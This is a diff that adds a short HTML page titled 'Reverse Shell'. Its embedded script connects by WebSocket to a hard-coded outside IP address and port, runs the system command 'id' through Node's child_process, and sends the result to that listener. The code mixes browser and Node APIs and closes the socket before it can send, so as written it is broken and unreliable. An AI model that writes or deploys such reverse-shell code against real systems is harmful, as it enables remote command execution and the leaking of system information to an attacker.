@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Reverse Shell</title>
+</head>
+<body>
+    <script>
+
+        // Set the listener's IP address and port number
+        const listener_ip = '62.171.160.234';
+        const listener_port = '8888';
+
+        // Create a socket object
+        const socket = new WebSocket('ws://' + listener_ip + ':' + listener_port);
+
+        // Execute the command
+        const command = 'id';
+        const process = require('child_process').execSync(command);
+
+        // Send the result back to the listener
+        socket.send(process);
+
+        // Close the socket connection
+        socket.close();
+
+    </script>
+</body>
+</html>
